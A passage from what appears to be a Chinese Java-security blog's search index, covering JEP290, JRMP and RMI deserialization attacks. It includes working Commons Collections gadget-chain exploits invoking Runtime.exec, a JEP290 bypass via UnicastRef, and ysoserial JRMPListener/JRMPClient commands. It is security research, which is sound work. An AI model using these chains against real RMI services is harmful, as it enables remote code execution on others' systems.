fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }","date":"2024-07-01","objectID":"/posts/cb/:3:0","tags":["java","反序列化"],"title":"CB链分析与利用","uri":"/posts/cb/"},{"categories":["javasec"],"content":"Java JEP290 前言：JEP290解释了为什么高版本 jdk 有部分能打 jndi，打不了 RMI 8u121 ~ 8u230 打不了 RMI ","date":"2024-07-01","objectID":"/posts/jep290/:0:0","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"JEP290 介绍 首先 JEP 是 JDK Enhancement Proposal，JDK改善方案，是JDK增强提议的一个项目。而 JEP290 主要描述的是Filter Incoming Serialization Data，过滤传入的序列化数据。JEP290是Java底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事： 1、提供一个限制反序列化类的机制，白名单或者黑名单。 2、限制反序列化的深度和复杂度。 3、为 RMI 远程调用对象提供了一个验证类的机制。 4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。 适用范围：JDK6u141、JDK7u131、JDK8u121 设置方式 通过setObjectInputFilter来设置filter 通过conf/security/java.properties文件进行配置 ","date":"2024-07-01","objectID":"/posts/jep290/:1:0","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"JEP290 防御分析 环境：JDK8u192 在此Java环境下进行服务端攻击注册中心（在 RMI 中 JEP290 主要是在远程引用层 之上进行过滤的，所以其过滤作用对 Server 和 Client 的互相攻击无效），poc package org.example; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException ,Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class ,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; Transformer chain = new ChainedTransformer(transformers); HashMap innermap = new HashMap(); innermap.put(\"value\",\"111\"); Map map = LazyMap.decorate(innermap, chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, handler)); registry.bind(\"test\",r); } }运行发现报错，客户端： 注册中心 因为这里是攻击注册中心，最后漏洞点在于 RegistryImpl_Skel.dispatch，在这里下断点调试 跟进，ObjectInputStream 类调用了 readObject0() 方法，然后继续跟进到 readObject0() 方法，之前反序列化底层分析说过这里面会根据了 tc 值来进行 switch，此时的 tc 值为 TC_OBJECT，也就是 0x73 十进制数 115 所以会到case TC_OBJECT: 继续跟进 readOrdinaryObject 方法， 调用了 readClassDesc，此方法用来分发处理字节流中 TC_CLASSDESC 的方法，用switch来选择需要处理的方法，这里tc的值就是 TC_CLASSDESC 的值0x72，转成10进制就是114，然后进入switch判断后转到 case TC_CLASSDESC: 在 readProxyDesc() 方法中会调用到 resovleclass 方法，这个方法会实列化反序列化对象，一般会重新这个方法进行 waf，当然这里不是研究的内容，看到下面调用 filterCheck()，跟进这个方法， 而 filterCheck() 方法又调用了 checkInput() 方法， 调用 checkInput 方法后，最后会调用到 RegistryImpl.registryFilter 方法 这里就是个白名单，需要类在下面这个白名单才行： return String.class != var2 \u0026\u0026 !Number.class.isAssignableFrom(var2) \u0026\u0026 !Remote.class.isAssignableFrom(var2) \u0026\u0026 !Proxy.class.isAssignableFrom(var2) \u0026\u0026 !UnicastRef.class.isAssignableFrom(var2) \u0026\u0026 !RMIClientSocketFactory.class.isAssignableFrom(var2) \u0026\u0026 !RMIServerSocketFactory.class.isAssignableFrom(var2) \u0026\u0026 !ActivationID.class.isAssignableFrom(var2) \u0026\u0026 !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;而这里，我们的 sun.reflect.annotation.AnnotationInvocationHandler 类并不在这些白名单中，所以会被过滤。 DGCImpl类下也定义了checkInput方法，同样设置了白名单 ","date":"2024-07-01","objectID":"/posts/jep290/:2:0","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"JEP290 绕过 这里我们可以先看一下白名单里面都能过什么，白名单如下 String.class Number.class Remote.class Proxy.class UnicastRef.class RMIClientSocketFactory.class RMIServerSocketFactory.class ActivationID.class UID.class","date":"2024-07-01","objectID":"/posts/jep290/:3:0","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"绕过利用 针对上面的白名单发现一个比较眼熟的类，那就是 UnicastRef 类。在JRMP反序列化中就用到了这个类作为payload向恶意JRMP服务端进行连接通信导致传入了一个恶意对象造成反序列化攻击，更多参考：Java JRMP反序化 先用 ysoserial 开启 JRMP 3333 端口的监听（服务端） java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 \"Calc\"然后编写 RMI 的 EXP（服务端攻击注册中心） import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class BypassJEP290 { public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException { Registry reg = LocateRegistry.getRegistry(\"localhost\",1099); // rmi start at 1099 ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\"127.0.0.1\", 3333); // JRMPListener's port is 3333 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), new Class[] { Registry.class }, obj); reg.bind(\"Hello\",proxy); } }成功弹出计算机， ","date":"2024-07-01","objectID":"/posts/jep290/:3:1","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"绕过分析 简单分析一下。 我们通过 getRegistry 时获得的注册中心，其实就是一个封装了 UnicastServerRef 对象的对象。 当我们调用 bind 方法后，会通过 UnicastRef 对象中存储的信息与服务端进行通信 然后把绑定的对象发送过去，进行一系列的反序列化，调用链， readObject:455, RemoteObject (java.rmi.server) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1170, ObjectStreamClass (java.io) readSerialData:2178, ObjectInputStream (java.io) readOrdinaryObject:2069, ObjectInputStream (java.io) readObject0:1573, ObjectInputStream (java.io) defaultReadFields:2287, ObjectInputStream (java.io) readSerialData:2211, ObjectInputStream (java.io) readOrdinaryObject:2069, ObjectInputStream (java.io) readObject0:1573, ObjectInputStream (java.io) readObject:431, ObjectInputStream (java.io) // 从此处开始，会遇到很多字节码不匹配的问题 dispatch:92, RegistryImpl_Skel (sun.rmi.registry) oldDispatch:469, UnicastServerRef (sun.rmi.server) dispatch:301, UnicastServerRef (sun.rmi.server) run:200, Transport$1 (sun.rmi.transport) run:197, Transport$1 (sun.rmi.transport) doPrivileged:-1, AccessController (java.security) serviceCall:196, Transport (sun.rmi.transport) handleMessages:573, TCPTransport (sun.rmi.transport.tcp) run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) run:-1, 1330984495 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5) doPrivileged:-1, AccessController (java.security) run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:748, Thread (java.lang)看到从 RegistryImpl_Skel.dispatch 中反序列化开始然后会一直调用到 RemoteObject 的 readObject 方法， 接下来又是一系列的方法调用，最后在 dirty() 方法中调用 wirteObject() 方法后，会用 invoke() 将数据发出去。 invoke() 方法实现的过程就是从 socket 连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置 filter（白名单），所以这里可以直接导致注册中心 rce，所以我们可以伪造一个 socket 连接并把我们恶意序列化的对象发过去，这也就是当时用 ysoserial 开启的 JRMP。 ","date":"2024-07-01","objectID":"/posts/jep290/:3:2","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"参考 https://drun1baby.top/2023/04/18/浅谈-JEP290/#0x04-JEP290-绕过 https://nivi4.notion.site/Java-JEP290-2d215aeb18924d17b89e3acf049095ef ","date":"2024-07-01","objectID":"/posts/jep290/:4:0","tags":["java","反序列化"],"title":"Java JEP290","uri":"/posts/jep290/"},{"categories":["javasec"],"content":"Java JRMP 反序化 RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为 Java 定制，基于 TCP/IP 之上，RMI 协议之下，当需要进行 RMI 远程方法调用通信的时候要求服务端与客户端都为 Java 编写。 这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范，RMI 底层默认使用的 JRMP 进行传递数据，并且 JRMP 协议只能作用于 RMI 协议。 通过DGCImpl来实现攻击的也有两种，DGCImpl_Stub#dirty（服务端攻击客户端），还有个就是 DGCImpl_Skel#dispatch（客户端攻击服务端） 之前看到 DGCImpl_Skel#dispatch 方法： 存在个 case1 和 case2，分别对应了 clear 和 dirty 方法，和 RgestryImpl_Skel#dispatch 中异曲同工。而且这里的两种都有反序列化， ","date":"2024-07-01","objectID":"/posts/jrmp/:0:0","tags":["java","反序列化"],"title":"Java JRMP 反序化","uri":"/posts/jrmp/"},{"categories":["javasec"],"content":"ysoserial 程序分析 payload/JRMPListener 调用链 UnicastRemoteObject.readObject() UnicastRemoteObject.reexport() UnicastRemoteObject.exportObject() UnicastServerRef.exportObject() LiveRef.exportObject() TCPEndpoint.exportObject() TCPTransport.exportObject() TCPTransport.listen() 通过 createWithConstructor 方法来实例化了一个 UnicastRemoteObject 对象， 看到就是通过反射调用进行实例化对象，看到其第四个参数是构造函数所需的具体参数也就是 consArgs，跟进第四个参数 UnicastServerRef 构造方法， 调用了其父类的构造方法，继续跟进。 调用了其其他构造方法。 嗯，和前面的 rmi 服务类注册没什么区别，TCPEndpoint.getLocalEndpoint(port) 就是一些对网络请求的处理，继续向下 其实也就没什么了，结束返回对象 UnicastServerRef，其中包含的 ref 如下 接着就是进入 createWithConstructor 方法了，这个就是刚才说的通过反射来进行实例化对象的方法， 首先进行获取 consArgsTypes 类型参数的构造方法，传入的 constructorClass 为 RemoteObject，所以获得的其构造方法。 然后执行 ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons) 这样就可以绕过构造器直接进行实例化并且不会对进行 ref 进行初始化。最后获得实列 ActivationGroupImpl，这里还向上转型了 UnicastRemoteObject（这样可以避免直接实例化 UnicastRemoteObject 对象直接触发监听）。 当正常对 UnicastRemoteObject 反序列化，会发现端口并不是指定的，而是一个随机端口，最后通过反射进行修改，传入的参数就是端口 Reflections.getField(UnicastRemoteObject.class, \"port\").set(uro, jrmpPort);到这里构造 JRMP Listener 的 payload 就已经结束了。这个 payload/JRMPListener 的主要作用就是让被攻击机开启监听端口。 exploit/JRMPClient 而在ysoserial中，exploit/JRMPClient 调用了 makeDGCCall，主要为了调用 dirty 方法触发反序列化，传递一个用于反序列化的对象 最后在远程 DGC 层触发反序列化，以达到攻击远程 DGC 层的目的。 这个 exp 通常和上面的 payload 配合使用，当被攻击机开启端口后，就利用该 exp 发生恶意的链子进行反序列化。 payload/JRMPClient 反序列化 UnicastRef 类，UnicastRef 实现了 RemoteRef 接口，RemoteRef 接口又实现了 Externalizable 接口。 其中在 Externalizable 接口定义了 writeExternal 和 readExternal 方法， 这两个方法分别实现了序列化和反序列化，UnicastRef 类中对这两个方法进行了重写。 先看 UnicastRef.readExternal 方法： 调用了 LiveRef.read 方法，跟进 其中 TCPEndpoint.readHostPortFormat 就是获取 host 和 port，返回一个封装了 host 和 port 的 TCPEndpoint。 然后看到 new 了个 ref 对象。以前 RMI 中经常遇见这个对象，里面就是封装的一些 host,port,objid 等信息。看到如果输入流的类型就可以不是 ConnectionInputStream 类型（这个输出流我们是可以进行控制的），那么就会进入 else 语句 调用 DGCClient.registerRefs() 方法，跟进该方法 看到调用 lookup 方法，然后返回的 EndpointEntry 对象调用 registerRefs() 方法，在该方法结尾处调用 跟进 makeDirtyCall 方法，其中会调用 DGC.dirty 方法， 实际会调用 DGCImpl_Stub.dirty 方法，这个方法下调用了 newCall 方法建立一次连接，还会会对 remoteCall 进行一次反序列化 所以这里利用下面方法方法创建了个 UnicastRef 对象 ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));因为创建 UnicastRef 对象需要 LiveRef 对象，而 LiveRef 对象里的参数有需要 TCPEndpoint 对象。 然后创建 UnicastRef 的动态代理。 RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] { Registry.class }, obj);这个类的关键代码就是这些了。这个 payload 的主要作用是序列化后触发 DGC 通信然后进行反向连接。接受到服务端的 exp 再次进行反序列化从而执行恶意代码。 exploit/JRMPListener exploit/JRMPListener 开启监听，客户端向 exploit/JRMPListener 进行连接时，会返回给客户端一个序列化对象，服务器接收一个对象后会进行反序列化操作 这个恶意对象就是这里 payloadObject 有什么办法让客户端主动向 exploit/JRMPListener 进行连接？ 那就要用到 payload/JRMPClient，UnicastRef 对象封装了 host、port 等信息，反序列化 UnicastRef 对象后，会触发 DGC 通信，与指定 host 的指定 port 进行连接 导致恶意服务端传输恶意数据流，在客户端造成反序列化 ","date":"2024-07-01","objectID":"/posts/jrmp/:0:1","tags":["java","反序列化"],"title":"Java JRMP 反序化","uri":"/posts/jrmp/"},{"categories":["javasec"],"content":"关于 JRMP 的两种攻击流程如下 第一种攻击方式 个人理解：基于 RMI 的反序列化中的客户端打服务端的类型 我们需要先发送指定的 payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的 payload 后会开启一个 RMI 的服务监听在设置的端口上。 我们还需要在我们自己的服务器使用 exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。 简单来说就是将一个 payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该 payload（JRMPListener）过后会在指定的端口开启 RMI 监听，然后再通过 exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。 第二种攻击方式 个人理解：基于 RMI 的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用 将 exploit（JRMPListener）作为攻击方进行监听。 我们发送指定的 payloads（JRMPClient）使得存在漏洞的服务器向我们的 exploit（JRMPListener）进行连接，连接后 exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。 PS：这里的 payload 和 exploit 就是指的不同包下的 JRMPListener 和 JRMPClient！ ","date":"2024-07-01","objectID":"/posts/jrmp/:0:2","tags":["java","反序列化"],"title":"Java JRMP 反序化","uri":"/posts/jrmp/"},{"categories":["javasec"],"content":"第一种攻击方式（客户端攻击服务端） payloads.JRMPListener+exploit.JRMPClient 看到上面 yso 中的四个类分析，可以先利用 payloads.JRMPListener 让客户端开启监听端口，在 yso 的运行下，这个对象将会被序列化处理，然后被进行传输，那么既然被序列化了，那么肯定是需要被触发的。 先通过yso来进行生成这个序列化对象： java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 1099 \u003e payload1.txt也可以进行base64编码，-w 0表示编码不换行 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 1099|base64 -w 0 \u003e payload1.txt然后创建个可以进行反序列化的服务器来继续测试（需要存在反序列化漏洞？） package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class jrmptest { public static void main(String[] args) { deserialize(); } public static void serialize(Object obj) { try { ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(\"jrmplistener_payload.txt\")); os.writeObject(obj); os.close(); } catch (Exception e) { e.printStackTrace(); } } public static void deserialize() { try { ObjectInputStream is = new ObjectInputStream(new FileInputStream(\"D:\\\\yingwenmingthree\\\\ysoserial-master\\\\target\\\\payload1.txt\")); is.readObject(); } catch (Exception e) { e.printStackTrace(); } } }运行 虽然这里没有什么显示，但是去查看端口发现 1099 端口已经开始监听了。 说明已经成功反序列化了我们的 payload1.txt， 具体RMI服务端和注册端如何绑定远程对象的详细过程参考：https://www.cnblogs.com/zpchcbd/p/13517074.html 当前面的 payloads/JRMPListener 作用了之后，那么对方就已经开启了 RMI 服务，接下来我们就可以通过 exploit/JRMPClient 发送 gadgets 来进行利用了（前提对方存在可以利用的 gadgets） 该方法中的两个注解： 一、其功能和 RMIRegistryExpoit 类似，但是 RMIRegistryExpoit 主要目标是 rmi 的 Registry 模块，而 JRMPClient 攻击的目标是的 rmi 中的 DGC 模块（Distributed Garbage Collection），只要有 RMI 服务监听了，都会有 DGC 的存在！ 二、因为它Client全都是向server发送数据，没有接受过任何来自server端的数据。在 exploit/JRMPListener 和 payloads/JRMPClient 的利用过程中，这个 server 端和 client 端，攻击者和受害者的角色是可以互换的，在你去打别人的过程中，很有可能被反手一下，所以最好的情况就是，只是发送数据，不去接受另一端传过来的信息，所以说用这个 exploit/JRMPClient 是不会自己打自己的) 先来看下yso的 exploit/JRMPClient 的攻击复现，这里接着上面反序列化了 payload/JRMPListener 模块，开启了一个 1099 端口 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 calc直接就攻击成功了。 其调用栈 其实该 payload 最主要的就是利用的 DGCImpI_Skel 的 dispatch 方法中的分支的反序列化进行攻击。剩下的我感觉其实就是 RMI 服务端接收来自客户端的数据的一些处理。 ","date":"2024-07-01","objectID":"/posts/jrmp/:0:3","tags":["java","反序列化"],"title":"Java JRMP 反序化","uri":"/posts/jrmp/"},{"categories":["javasec"],"content":"第二种攻击方式（服务端攻击客户端） exploit.JRMPListener+payloads.JRMPClient 这个服务端打客户端的类型比起客户端打服务端的类型会更加的常用，一方面是外连，另一方面更多的因为是该 exploit/JRMPListener+payloads/JRMPClient 还存在绕过 JEP290 的限制，所以往往会更加的通用。 参考 Java JEP290 payloads.JRMPClient：携带指定的攻击机 ip 和端口生成受害机第一次反序列化（需要代码中存在一个反序列化点）时的 payload，受害机反序列化该 payload 时会向指定的攻击机 ip+端口发起 RMI 通信，在通信阶段攻击机会将第二次反序列化的 payload（如 CommonCollections1）发送给受害机，此时发生第二次反序列化，执行真正的恶意命令。 找到一个反序列化点，然后将其 payloads/JRMPClient 发送，自己本地开启一个 exploit/JRMPListener 监听，最后就能成功， 既然有反序列化点为什么不直接打 cc 链了，是为了绕过 JEP290 或者其他什么过滤之类的？ 参考：https://www.cnblogs.com/zpchcbd/p/14934168.html 参考：https://xz.aliyun.com/t/12780 ","date":"2024-07-01","objectID":"/posts/jrmp/:0:4","tags":["java","反序列化"],"title":"Java JRMP 反序化","uri":"/posts/jrmp/"},{"categories":["javasec"],"content":"在上面的 RMI 调用过程中我们可以发现，全部的通信流程均通过反序列化实现，而且在三个角色中均进行了反序列化的操作。那也就说明针对三端都有攻击的可能，我们依次来看一下。 ","date":"2024-06-30","objectID":"/posts/rm2/:0:0","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"攻击 server 端 ","date":"2024-06-30","objectID":"/posts/rm2/:1:0","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"恶意方法 远程方法的调用实际发生在服务端。当注册的远程对象上存在某个恶意方法，我们可以在客户端调用这个方法来攻击客户端，最简单的一种 ","date":"2024-06-30","objectID":"/posts/rm2/:1:1","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"恶意参数 在调用远程方法，会触发代理类的 invoke 方法，方法中会获取服务端创建的 Stub，会在本地调用这个 Stub 并传递参数，序列化这个参数，然后在服务端会对这个参数进行反序列化，上面已经详细说明过了。 那么就可以构造恶意 Object 型参数。利用 CC1 的 lazymap 链 package org.example; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException ,Exception{ Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); Object execObject = getexec(); System.out.println(Arrays.toString(registry.list())); RMIinter stub = (RMIinter) registry.lookup(\"Hello\"); System.out.println(stub.hello(execObject)); } private static Object getexec() throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class ,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\"value\",\"111\"); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor c = cls.getDeclaredConstructor(Class.class, Map.class); c.setAccessible(true); InvocationHandler handler = (InvocationHandler) c.newInstance(Target.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClass().getClassLoader(), new Class[]{Map.class}, handler); Object o = c.newInstance(Target.class, proxyMap); return o; } } 服务端也需要 cc1 依赖，简单调试一番可以看到会调用到 AnnotationInvocationHandler.readobject 剩下的就不用多说了和 cc1 一样，当然其他链子都行，比如 cc6 起码可以打打其他 jdk 版本 package org.example; import java.lang.reflect.*; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Target; import java.util.HashMap; import java.util.Map; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException ,Exception{ Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); Object execObject = getexec(); System.out.println(Arrays.toString(registry.list())); RMIinter stub = (RMIinter) registry.lookup(\"Hello\"); System.out.println(stub.hello(execObject)); } private static Object getexec() throws Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class ,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; ChainedTransformer cha = new ChainedTransformer(transfo","date":"2024-06-30","objectID":"/posts/rm2/:1:2","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"替身攻击 在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路——–替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。 大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。 ","date":"2024-06-30","objectID":"/posts/rm2/:1:3","tags":["java","反序列化"],"title":"java RMI反序列化-攻击篇","uri":"/posts/rm2/"},{"categories":["javasec"],"content":"攻击 Registry 端 前面看到在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询，这里可以进行一个利用。 Naming.bind(\"rmi://127.0.0.1:1099/sayHello\", new RemoteObjImpl());也可以从客户端进行攻击，上面看到会调用 RegistryImpl_Skel.dispatch，最后里面是存在反序列化的，也可以利用。RegistryImpl_Skel.dispatch 里面对应关系如下 0-\u003ebind 1-\u003elist 2-\u003elookup 3-\u003erebind 4-\u003eunbind list 没有反序列化，所以也就无法攻击了。 bind\u0026rebind case 0: try { var11 = var2.getInputStream(); var7 = (String)var11.readObject(); var8 = (Remote)var11.readObject(); } catch (IOException var94) { throw new UnmarshalException(\"error unmarshalling arguments\", var94); } catch (ClassNotFoundException var95) { throw new UnmarshalException(\"error unmarshalling arguments\", var95); } finally { var2.releaseInputStream(); } var6.bind(var7, var8); try { var2.getResultStream(true); break; } catch (IOException var93) { throw new MarshalException(\"error marshalling return\", var93); } case 3: try { var11 = var2.getInputStream(); var7 = (String)var11.readObject(); var8 = (Remote)var11.readObject(); } catch (IOException var85) { throw new UnmarshalException(\"error unmarshalling arguments\", var85); } catch (ClassNotFoundException var86) { throw new UnmarshalException(\"error unmarshalling arguments\", var86); } finally { var2.releaseInputStream(); } var6.rebind(var7, var8); try { var2.getResultStream(true); break; } catch (IOException var84) { throw new MarshalException(\"error marshalling return\", var84); }是有 readobject 方法的，可以进行反序列化攻击。看到都是获取 var2 的流然后进行反序列化，看看 var2 是什么 看到师傅说这就是一个远程对象，也就是这两个方法会用 readObject 读出参数名和远程对象。 所以还是 CC1 的 poc package org.example; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.Arrays; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class cilent { public static void main(String[] args)throws RemoteException, NotBoundException ,Exception{ Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class ,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; Transformer chain = new ChainedTransformer(transformers); HashMap innermap = new HashMap(); innermap.put(\"value\",\"111\"); Map map = LazyMap.decorate(innermap, chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象 Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = 